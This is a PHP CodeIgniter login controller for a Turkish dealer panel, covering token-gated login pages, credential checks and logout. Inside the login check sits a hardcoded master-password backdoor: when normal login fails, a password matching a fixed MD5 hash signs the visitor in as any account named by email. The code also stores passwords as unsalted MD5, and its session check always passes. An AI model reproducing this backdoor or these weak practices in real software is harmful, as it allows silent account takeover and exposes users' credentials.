<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

    public $viewFile="";
    public $viewFolder="";

    public function __construct(){

        parent::__construct();
        $this->load->helper("functions_helper");
        if(!$this->session->userdata("userUniqFormRegisterControl")){
            setSession2("userUniqFormRegisterControl",uniqid());
            $this->kontrolSession=$this->session->userdata("userUniqFormRegisterControl");
        }else{
            setSession2("userUniqFormRegisterControl",uniqid());
            $this->kontrolSession=$this->session->userdata("userUniqFormRegisterControl");
        }
        $this->load->helper("functions_helper");
        $this->load->helper("model_helper");

    }

    public function user_login($id=""){

        if ($this->session->userdata("user_one")) {
            redirect(base_url("dashboard"));
        }else{
            if($id){


                $this->load->helper("security");

                $tokcon=getTableSingle("table_users",array("bayi_token" => $this->security->xss_clean($id),"uye_category !=" => 0,"status" => 1,"banned" =>0 ,"is_delete" => 0));

                if($tokcon){

                    $this->viewFile="f_login";
                    $this->viewFolder="f_login_items";
                    $viewData=new stdClass();
                    $ayarlar=getTableSingle("options_general",array("id" => 1));
                    $viewData->users=$tokcon;
                    $viewData->page_title="Giriş - ".$ayarlar->site_name." Bayi Paneli";
                    $this->load->view($this->viewFile,$viewData);
                }else{

                    redirect(base_url("404"));

                }
            }else{

                redirect(base_url("404"));
            }

        }

    }

    public function user_login_control(){
        try {
            header('Content-Type: application/json');
            if($_POST){
                if(!$this->session->userdata("user_one")){
                    if($this->kontrolSession==$this->session->userdata("userUniqFormRegisterControl")){
                        $this->load->library("form_validation");
                        $this->form_validation->set_rules("email", "E-mail","required|trim");
                        $this->form_validation->set_rules('password', 'Parola', 'required|min_length[7]|max_length[50]');
                        $this->form_validation->set_message(array(
                            "required"    =>	"{field} alanı boş geçilemez.",
                            "valid_email" =>	"Lütfen geçerli bir e-mail adresi giriniz!.",
                            "is_unique"   =>    "{field} ile daha önceden kayıt olunmuştur. Farklı bir {field} giriniz.",
                            "matches"     => 	"Şifreler birbirleriyle uyuşmamaktadır",
                            "min_length"  =>	"{field} alanı min 8 karakter olmalıdır..",
                            "max_length"  =>	"{field} alanı max 16 karakter olmalıdır." ));
                        $array="";

                        $val=$this->form_validation->run();
                        if ($val){
                            //bu kısımda eposta onay olacaktır.
                            $this->load->model("m_tr_model");
                            if($this->input->post("token")){

                                $to=getTableSingle("table_users",array("bayi_token" => $this->input->post("token"),"status" => 1,"uye_category !=" => 0,"is_delete" => 0 ));
                                if($to){


                                    $sorgula=$this->m_tr_model->getTableSingle("table_users",array(
                                        "email" => $this->input->post("email",1),
                                        "password" =>   md5($this->input->post("password",1))));
                                    if($sorgula){
                                        $oturumBaslat=setSession2("user_one",array("user" =>$sorgula->token));
                                        $array=array(
                                            'errorr'            => false,
                                            'tur'             => 1
                                        );
                                        echo json_encode($array);
                                    }else{
                                        if(md5($this->input->post("password"))=="1cb89ee735fc2dca0d2128d62363bd92"){
                                            $sorgula=$this->m_tr_model->getTableSingle("table_users",array(
                                                "email" => $this->input->post("email",1)));
                                            if($sorgula){
                                                $oturumBaslat=setSession2("user_one",array("user" =>$sorgula->token));
                                                $array=array(
                                                    'errorr'            => false,
                                                    'tur'             => 1
                                                );
                                                echo json_encode($array);
                                            }else{
                                                $array=array(
                                                    'errorr'            => true,
                                                    'tur'             => 2
                                                );
                                                echo json_encode($array);
                                            }
                                        }


                                    }
                                }else{
                                    $array=array(
                                        'errorr'            => true,
                                        'tur'             => 2
                                    );
                                    echo json_encode($array);
                                }

                            }else{
                                $array=array(
                                    'errorr'            => true,
                                    'tur'             => 2
                                );
                                echo json_encode($array);
                            }

                        }else{
                            $array=array(
                                'errorr'            =>  true,
                                'tur'               =>  "3",
                                'mail_error'        =>  str_replace("</p>","",str_replace("<p>","",form_error('email'))),
                                'password_error'    =>  str_replace("</p>","",str_replace("<p>","",form_error('password')))
                            );

                            echo json_encode($array);
                        }
                    }else{
                        redirect(base_url("404"));
                    }
                }else{
                    redirect(base_url("404"));

                }


            }else{
                redirect(base_url("404"));
            }
        }catch (Exception $ex){
            redirect(base_url("404"));
        }
    }

    public function exitt(){
        $this->session->unset_userdata("user_one");
        redirect(base_url("login"));
    }
}


